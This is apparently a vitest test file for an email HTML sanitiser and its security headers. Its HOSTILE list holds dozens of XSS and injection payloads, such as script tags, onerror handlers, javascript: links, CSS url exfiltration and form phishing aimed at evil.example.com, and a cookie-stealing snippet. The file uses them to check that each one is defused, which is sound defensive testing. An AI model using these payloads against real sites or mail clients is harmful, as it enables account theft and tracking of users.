import { createHash } from "node:crypto";

import { describe, expect, it } from "vitest";

import {
  emailBodyHeaders,
  emailDocument,
  looksLikeImage,
  renderEmailBody,
  sanitiseForStorage,
  textDocument,
} from "@/lib/backstage/mail/sanitise";

/**
 * Hostile HTML, thrown at both passes: the one that makes the copy a message
 * is stored with, and the one that makes what the screen shows. And the
 * headers that copy is served with, which are the wall behind both.
 */

const clean = (html: string) => sanitiseForStorage(html).html;

const TAGS = new Set(
  "p br hr div span blockquote pre code h1 h2 h3 h4 h5 h6 b strong i em u s strike del ins small big sub sup mark abbr cite q kbd samp var tt center font a ul ol li dl dt dd table thead tbody tfoot tr td th caption colgroup col img".split(
    " ",
  ),
);
const ATTRIBUTES = new Set(
  "style title dir lang align valign href target rel src data-src alt width height border cellpadding cellspacing bgcolor colspan rowspan nowrap scope span color size face start type value".split(
    " ",
  ),
);

/**
 * Read cleaned HTML the strict way: every `<` must open a tag from the
 * allow-list whose attributes are all `name="value"` with names from the
 * allow-list. Anything else throws. This is what "nothing got through"
 * means, said structurally instead of by looking for particular strings.
 */
function tagsOf(html: string): { name: string; attrs: Record<string, string> }[] {
  const out: { name: string; attrs: Record<string, string> }[] = [];
  const tag = /<(\/?)([a-z][a-z0-9]*)((?:\s+[a-z][a-z0-9-]*(?:="[^"<>]*")?)*)\s*\/?>/gy;
  let at = 0;
  while (at < html.length) {
    const open = html.indexOf("<", at);
    if (open === -1) break;
    tag.lastIndex = open;
    const match = tag.exec(html);
    if (match === null) {
      throw new Error(`not a clean tag at: ${html.slice(open, open + 60)}`);
    }
    const [, closing, name = "", rawAttrs = ""] = match;
    if (!TAGS.has(name)) throw new Error(`tag not allowed: ${name}`);
    const attrs: Record<string, string> = {};
    for (const attr of rawAttrs.matchAll(/([a-z][a-z0-9-]*)(?:="([^"]*)")?/g)) {
      const key = attr[1] ?? "";
      if (!ATTRIBUTES.has(key)) throw new Error(`attribute not allowed: ${key}`);
      attrs[key] = attr[2] ?? "";
    }
    if (closing === "") out.push({ name, attrs });
    at = tag.lastIndex;
  }
  // With every clean tag taken out, what is left is text, and text has no
  // brackets in it: they are written as &lt; and &gt;.
  const leftover = html.replace(
    /<\/?[a-z][a-z0-9]*(?:\s+[a-z][a-z0-9-]*(?:="[^"<>]*")?)*\s*\/?>/g,
    "",
  );
  if (/[<>]/.test(leftover)) throw new Error(`stray bracket in: ${leftover}`);
  return out;
}

/** No address anywhere in the output that a browser would run or fetch from. */
function expectInert(
  html: string,
  options: { readonly remote?: boolean } = {},
): void {
  const tags = tagsOf(html);
  for (const { name, attrs } of tags) {
    if (attrs.href !== undefined) {
      expect(attrs.href, `${name} href`).toMatch(/^(https?:\/\/|mailto:|tel:)/);
    }
    if (attrs.src !== undefined) {
      // A kept picture's src is only ever its own bytes. A shown one may
      // also be an ordinary web address, when the reader asked for pictures.
      expect(attrs.src, `${name} src`).toMatch(
        options.remote === true
          ? /^(data:image\/(png|jpeg|jpg|gif|webp);base64,|https?:\/\/)/
          : /^data:image\/(png|jpeg|jpg|gif|webp);base64,/,
      );
    }
    if (attrs["data-src"] !== undefined) {
      expect(attrs["data-src"], `${name} data-src`).toMatch(/^https?:\/\//);
    }
    if (attrs.style !== undefined) {
      expect(attrs.style).not.toMatch(
        /url|expression|position|z-index|behavior|binding|@import|javascript/i,
      );
    }
  }
  expect(html).not.toMatch(/javascript:|vbscript:|data:text|livescript:/i);
}

const HOSTILE: readonly (readonly [string, string])[] = [
  ["a script tag", "<p>hi</p><script>alert(1)</script>"],
  ["a script tag in odd case", "<ScRiPt SRC=//evil.example.com/x.js></sCrIpT>"],
  ["a script hidden in a broken tag", "<scr<script>ipt>alert(1)</scr</script>ipt>"],
  ["an onerror handler", '<img src="x" onerror="alert(1)">'],
  ["an onerror handler with no quotes", "<img src=x onerror=alert(1)>"],
  ["an onload on the body", '<body onload="alert(1)"><p>hi</p></body>'],
  ["a handler on an allowed tag", '<p onclick="alert(1)" onmouseover=alert(2)>hi</p>'],
  ["a javascript link", '<a href="javascript:alert(1)">click</a>'],
  ["a javascript link in odd case", '<a href="JaVaScRiPt:alert(1)">click</a>'],
  ["a javascript link with a tab in it", '<a href="java\tscript:alert(1)">click</a>'],
  ["a javascript link with a line break in it", '<a href="java\nscript:alert(1)">click</a>'],
  ["a javascript link behind entities", '<a href="&#106;&#97;&#118;&#97;script:alert(1)">click</a>'],
  ["a javascript link with a leading space", '<a href="  javascript:alert(1)">click</a>'],
  ["a vbscript link", '<a href="vbscript:msgbox(1)">click</a>'],
  ["a data link", '<a href="data:text/html,<script>alert(1)</script>">click</a>'],
  ["a data link in base64", '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>'],
  ["a style block with an import", '<style>@import url("https://evil.example.com/x.css"); p{color:red}</style><p>hi</p>'],
  ["a style block that reads the page", "<style>a[href^=h]{background:url(https://evil.example.com/?h)}</style><a href=https://ok.example.com>x</a>"],
  ["a link to a stylesheet", '<link rel="stylesheet" href="https://evil.example.com/x.css">'],
  ["a form", '<form action="https://evil.example.com/collect" method="post"><input name="password" type="password"><button formaction="https://evil.example.com/2">Sign in</button></form>'],
  ["a lone input that grabs focus", '<input autofocus onfocus="alert(1)">'],
  ["a tracking pixel", '<img src="https://track.example.com/open.gif?id=42" width="1" height="1">'],
  ["a tracking pixel in a srcset", '<img srcset="https://track.example.com/a.gif 1x, https://track.example.com/b.gif 2x" alt="x">'],
  ["a tracking pixel with no scheme", '<img src="//track.example.com/open.gif">'],
  ["a picture off our own site", '<img src="/backstage/files/fil_someoneelses1234567?view=1">'],
  ["an svg with a script", '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><circle r="4"/></svg>'],
  ["an svg with a javascript link", '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
  ["an svg that animates a link", '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>'],
  ["an svg as a picture", '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">'],
  ["an svg as a picture, unencoded", "<img src='data:image/svg+xml,<svg onload=alert(1)>'>"],
  ["a meta refresh", '<meta http-equiv="refresh" content="0; url=https://evil.example.com/">'],
  ["a meta refresh to javascript", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ["a base href", '<base href="https://evil.example.com/"><a href="/login">Sign in</a>'],
  ["a base target", '<base target="_top"><a href="https://ok.example.com/">x</a>'],
  ["an iframe", '<iframe src="https://evil.example.com/"></iframe>'],
  ["an iframe with its own page inside", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["an object and an embed", '<object data="https://evil.example.com/x.swf"></object><embed src="https://evil.example.com/x.swf">'],
  ["a video with a handler", '<video><source src="x" onerror="alert(1)"></video><audio src="x" onerror="alert(2)"></audio>'],
  ["a details toggle handler", '<details open ontoggle="alert(1)"><summary>x</summary></details>'],
  ["a marquee handler", '<marquee onstart="alert(1)">x</marquee>'],
  ["a style that covers the page", '<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:url(https://evil.example.com/overlay.png)">Your session has ended</div>'],
  ["a style with an expression", '<p style="width:expression(alert(1))">x</p>'],
  ["a style with a background image", '<p style="background-image:url(https://track.example.com/bg.gif)">x</p>'],
  ["a style with a moz-binding", '<p style="-moz-binding:url(https://evil.example.com/x.xml#y)">x</p>'],
  ["a style with an escaped url", '<p style="background:\\75rl(https://evil.example.com/x)">x</p>'],
  ["a style that breaks out of its attribute", '<p style="color:red&quot; onclick=&quot;alert(1)">x</p>'],
  ["a border with a url in it", '<p style="border:1px solid url(https://evil.example.com/x)">x</p>'],
  ["a table background", '<table background="https://track.example.com/bg.gif"><tr><td background="https://track.example.com/2.gif">x</td></tr></table>'],
  ["a link with sign-in details in it", '<a href="https://quickpickle.co.nz@evil.example.com/login">quickpickle.co.nz</a>'],
  ["a link that opens over the back end", '<a href="https://ok.example.com/" target="_top">x</a>'],
  ["a noscript trick", '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
  ["a comment trick", "<!--><img src=x onerror=alert(1)>-->"],
  ["a conditional comment", "<!--[if gte mso 9]><script>alert(1)</script><![endif]-->"],
  ["a textarea trick", "<textarea></textarea><img src=x onerror=alert(1)>"],
  ["a title trick", "<title><img src=x onerror=alert(1)></title>"],
  ["a template", "<template><script>alert(1)</script></template>"],
  ["math", '<math><maction actiontype="statusline#https://evil.example.com" xlink:href="javascript:alert(1)">x</maction></math>'],
  ["an attribute name with a slash in it", '<img/src="x"/onerror=alert(1)>'],
  ["ids and classes", '<p id="main" class="bk-btn sr-only">x</p>'],
  ["an unclosed tag at the end", '<p>fine</p><img src="https://track.example.com/x.gif" onerror="alert(1)"'],
  ["a null byte in a tag name", "<scr\u0000ipt>alert(1)</scr\u0000ipt>"],
];


describe("the copy that is kept", () => {
  it.each(HOSTILE)("defuses %s", (_name, html) => {
    const out = clean(html);
    expectInert(out);
    // And the copy for the screen, made from the same dirty input, is as
    // inert with pictures off as with them on.
    for (const showPictures of [false, true]) {
      expectInert(renderEmailBody(html, { showPictures }), { remote: true });
    }
  });

  it("removes scripts and their contents, not just the tags", () => {
    const out = clean(
      "<p>before</p><script>var stolen = document.cookie;</script><style>p{background:url(//evil.example.com/t.gif)}</style><p>after</p>",
    );
    expect(out).toBe("<p>before</p><p>after</p>");
    expect(clean("<noscript><p>hidden</p></noscript>ok")).toBe("ok");
    expect(clean("<title>x</title><textarea>y</textarea>ok")).toBe("ok");
    expect(clean("<svg><script>alert(1)</script><text>z</text></svg>ok")).toBe("ok");
  });

  it("keeps a link's words when the link itself has to go", () => {
    expect(clean('<a href="javascript:alert(1)">click here</a>')).toBe("click here");
    expect(clean('<a href="//evil.example.com">protocol-relative</a>')).toBe(
      "protocol-relative",
    );
    expect(clean("<a>no address</a>")).toBe("no address");
  });

  it("makes every surviving link open safely in a new tab", () => {
    const [link] = tagsOf(
      clean('<a href="https://example.com/a?b=1&c=2" target="_top" rel="opener" onclick="x()">go</a>'),
    );
    expect(link?.attrs).toEqual({
      href: "https://example.com/a?b=1&amp;c=2",
      target: "_blank",
      rel: "noopener noreferrer nofollow",
    });
    expect(clean('<a href="mailto:hello@example.com">write</a>')).toContain(
      'href="mailto:hello@example.com"',
    );
    // An address with sign-in details in front of the host is a trick.
    expect(clean('<a href="https://quickpickle.co.nz@evil.example.com/">x</a>')).toBe("x");
  });

  it("moves remote pictures aside where nothing loads them, and counts them", () => {
    const result = sanitiseForStorage(
      '<p>Hello</p><img src="https://tracker.example.com/open.gif?u=42" width="1" height="1"><img src="http://example.com/logo.png" alt="Logo">',
    );
    const pictures = tagsOf(result.html).filter((tag) => tag.name === "img");
    expect(pictures).toHaveLength(2);
    for (const picture of pictures) expect(picture.attrs.src).toBeUndefined();
    expect(pictures[0]?.attrs["data-src"]).toBe(
      "https://tracker.example.com/open.gif?u=42",
    );
    expect(result.pictures).toBe(2);
    expect(result.html).not.toMatch(/\ssrc="/);
  });

  it("keeps a picture that is carried inside the message, unless it is an svg", () => {
    const png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";
    expect(clean(`<img src="data:image/png;base64,${png}" alt="dot">`)).toContain(
      `src="data:image/png;base64,${png}"`,
    );
    expect(
      clean('<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="svg">'),
    ).toBe('<img alt="svg" />');
    expect(clean('<img src="data:text/html;base64,PHNjcmlwdD4=" alt="x">')).toBe(
      '<img alt="x" />',
    );
  });

  it("counts the message's own pictures and keeps none of their addresses", () => {
    const result = sanitiseForStorage(
      '<p>See</p><img src="cid:photo-1@mail.example.com" alt="The parcel"><img src="CID:%3Clogo%3E">',
    );
    expect(result.pictures).toBe(2);
    expect(result.html).not.toMatch(/cid:/i);
    expect(tagsOf(result.html).filter((tag) => tag.name === "img")).toEqual([
      { name: "img", attrs: { alt: "The parcel" } },
    ]);
  });

  it("keeps the formatting an honest email uses", () => {
    const html =
      '<h2>Quote</h2><p>Hi <b>Ashleigh</b>, <i>thanks</i>.</p><ul><li>one</li><li>two</li></ul><table><tbody><tr><td colspan="2">cell</td></tr></tbody></table><blockquote>earlier</blockquote>';
    expect(clean(html)).toBe(html);
  });

  it("keeps only the inline styles on the list", () => {
    const out = clean(
      '<p style="color: red; position: fixed; top: 0; background-image: url(https://evil.example.com/a.png); font-weight: bold; z-index: 99999; width: expression(alert(1)); margin: 0 auto">x</p>',
    );
    const [p] = tagsOf(out);
    expect(p?.attrs.style).toBe("color:red;font-weight:bold;margin:0 auto");
  });

  it("escapes text so it cannot become markup later", () => {
    expect(clean("1 < 2 and <b>3 > 2</b> &lt;script&gt;")).toBe(
      "1 &lt; 2 and <b>3 &gt; 2</b> &lt;script&gt;",
    );
    expect(clean('<p title="a&quot;b">x</p>')).toBe('<p title="a&quot;b">x</p>');
  });

  it("flattens nesting deeper than any real email goes", () => {
    const deep = `${"<div>".repeat(400)}bottom${"</div>".repeat(400)}`;
    const out = clean(deep);
    expect(out).toContain("bottom");
    expect(tagsOf(out).length).toBeLessThanOrEqual(80);
  });
});

describe("the copy that is shown", () => {
  const original =
    '<p>Hi</p><img src="https://tracker.example.com/open.gif" alt="tracker"><img src="cid:photo-1@mail.example.com" alt="The parcel"><img src="cid:not-ours" alt="Missing">';
  const png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";
  const own = { "photo-1@mail.example.com": `data:image/png;base64,${png}` };

  it("loads no picture at all until the reader asks", () => {
    const html = renderEmailBody(original, {
      showPictures: false,
      ownPictures: own,
    });
    const pictures = tagsOf(html).filter((tag) => tag.name === "img");
    expect(pictures.map((picture) => picture.attrs)).toEqual([
      { alt: "tracker" },
      { alt: "The parcel" },
      { alt: "Missing" },
    ]);
    expect(html).not.toMatch(/src=|tracker\.example\.com|data:/);
  });

  it("when asked, fills in the message's own pictures and lets the remote ones load", () => {
    const html = renderEmailBody(original, {
      showPictures: true,
      ownPictures: own,
    });
    const pictures = tagsOf(html).filter((tag) => tag.name === "img");
    expect(pictures.map((picture) => picture.attrs)).toEqual([
      { alt: "tracker", src: "https://tracker.example.com/open.gif" },
      { alt: "The parcel", src: `data:image/png;base64,${png}` },
      { alt: "Missing" },
    ]);
  });

  it("only ever fills a picture in with a real picture", () => {
    for (const planted of [
      "https://evil.example.com/x.png",
      "data:text/html;base64,PHNjcmlwdD4=",
      "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
      "javascript:alert(1)",
    ]) {
      const html = renderEmailBody('<img src="cid:a" alt="a">', {
        showPictures: true,
        ownPictures: { a: planted },
      });
      expect(html, planted).toBe('<img alt="a" />');
    }
  });

  it("a kept copy can be shown again: what was moved aside comes back only when asked", () => {
    const kept = sanitiseForStorage(original).html;
    expect(renderEmailBody(kept, { showPictures: false })).not.toMatch(/src=/);
    expect(renderEmailBody(kept, { showPictures: true })).toContain(
      'src="https://tracker.example.com/open.gif"',
    );
  });

  it("nothing a sender writes can pass for our own picture placeholder", () => {
    // `data-src` is ours. A sender who writes one gets it treated like any
    // other remote address: never loaded unasked, never anything but http.
    const off = renderEmailBody('<img data-src="https://evil.example.com/a.png" alt="a">', {
      showPictures: false,
    });
    expect(off).toBe('<img alt="a" />');
    const script = renderEmailBody('<img data-src="javascript:alert(1)" alt="a">', {
      showPictures: true,
    });
    expect(script).toBe('<img alt="a" />');
  });

  it("is cleaned from whatever it is handed, every time", () => {
    for (const [name, html] of HOSTILE) {
      for (const showPictures of [false, true]) {
        const once = renderEmailBody(html, { showPictures });
        // Cleaning what was already cleaned finds nothing more to remove.
        expect(renderEmailBody(once, { showPictures }), name).toBe(once);
      }
    }
  });
});

describe("the page and the headers it is served with", () => {
  const policy = (showPictures: boolean) =>
    emailBodyHeaders(showPictures)["content-security-policy"] ?? "";
  const directives = (showPictures: boolean) =>
    new Map(
      policy(showPictures)
        .split(";")
        .map((part) => part.trim())
        .map((part) => {
          const [name = "", ...rest] = part.split(/\s+/);
          return [name, rest.join(" ")] as const;
        }),
    );

  it("sandboxes the document: an origin of its own and no scripts", () => {
    for (const showPictures of [false, true]) {
      const sandbox = directives(showPictures).get("sandbox") ?? "missing";
      expect(sandbox).not.toMatch(/allow-scripts/);
      expect(sandbox).not.toMatch(/allow-same-origin/);
      expect(sandbox).not.toMatch(/allow-forms/);
      expect(sandbox).not.toMatch(/allow-top-navigation/);
      // Links open a new, ordinary tab. Nothing else is let out.
      expect(sandbox.split(" ").sort()).toEqual([
        "allow-popups",
        "allow-popups-to-escape-sandbox",
      ]);
    }
  });

  it("loads nothing by default, and pictures only when the reader asked", () => {
    const off = directives(false);
    expect(off.get("default-src")).toBe("'none'");
    expect(off.get("img-src")).toBe("'none'");
    expect(off.has("script-src")).toBe(false);
    expect(off.get("form-action")).toBe("'none'");
    expect(off.get("base-uri")).toBe("'none'");
    expect(off.get("frame-ancestors")).toBe("'self'");

    const on = directives(true);
    expect(on.get("default-src")).toBe("'none'");
    expect(on.get("img-src")).toBe("data: https: http:");
    expect(on.has("script-src")).toBe(false);
    for (const each of [off, on]) {
      expect([...each.values()].join(" ")).not.toMatch(
        /unsafe-eval|script|connect|\*/,
      );
    }
  });

  it("says what it is, and that it must not be kept or sniffed", () => {
    const headers = emailBodyHeaders(false);
    expect(headers["content-type"]).toBe("text/html; charset=utf-8");
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["referrer-policy"]).toBe("no-referrer");
    expect(headers["cache-control"]).toBe("private, no-store");
  });

  it("names its own style sheet by hash and no other", () => {
    const page = emailDocument("<p>x</p>");
    const sheet = /<style>([^<]*)<\/style>/.exec(page)?.[1] ?? "";
    expect(sheet).not.toBe("");
    const hash = createHash("sha256").update(sheet).digest("base64");
    expect(policy(false)).toContain(`style-src-elem 'sha256-${hash}'`);
    expect(page.match(/<style/g)).toHaveLength(1);
    expect(page).not.toMatch(/<script|<link|<iframe|<object|<form/i);
  });

  it("opens links in a new tab and sends no referrer", () => {
    const page = emailDocument("<p>x</p>");
    expect(page).toContain('<base target="_blank">');
    expect(page).toContain('<meta name="referrer" content="no-referrer">');
  });

  it("shows plain text as text, whatever is in it", () => {
    const page = textDocument('<script>alert(1)</script> & "quotes" </pre><img src=x onerror=alert(1)>');
    const body = /<body>([\s\S]*)<\/body>/.exec(page)?.[1] ?? "";
    expect(body).toBe(
      '<pre>&lt;script&gt;alert(1)&lt;/script&gt; &amp; "quotes" &lt;/pre&gt;&lt;img src=x onerror=alert(1)&gt;</pre>',
    );
  });
});

describe("is it really a picture", () => {
  const bytes = (...values: number[]) => new Uint8Array(values);

  it("goes by the first bytes, not by what the email called it", () => {
    expect(
      looksLikeImage(bytes(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0), "image/png"),
    ).toBe(true);
    expect(looksLikeImage(bytes(0xff, 0xd8, 0xff, 0xe0), "image/jpeg")).toBe(true);
    expect(looksLikeImage(bytes(0x47, 0x49, 0x46, 0x38, 0x39, 0x61), "image/gif")).toBe(true);
    expect(
      looksLikeImage(
        bytes(0x52, 0x49, 0x46, 0x46, 0, 0, 0, 0, 0x57, 0x45, 0x42, 0x50),
        "image/webp",
      ),
    ).toBe(true);
  });

  it("refuses markup dressed up as a picture, and every other type", () => {
    const html = new TextEncoder().encode("<html><script>alert(1)</script>");
    const svg = new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg">');
    expect(looksLikeImage(html, "image/png")).toBe(false);
    expect(looksLikeImage(html, "image/jpeg")).toBe(false);
    expect(looksLikeImage(svg, "image/svg+xml")).toBe(false);
    expect(looksLikeImage(bytes(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a), "text/html")).toBe(false);
    expect(looksLikeImage(bytes(), "image/png")).toBe(false);
  });
});
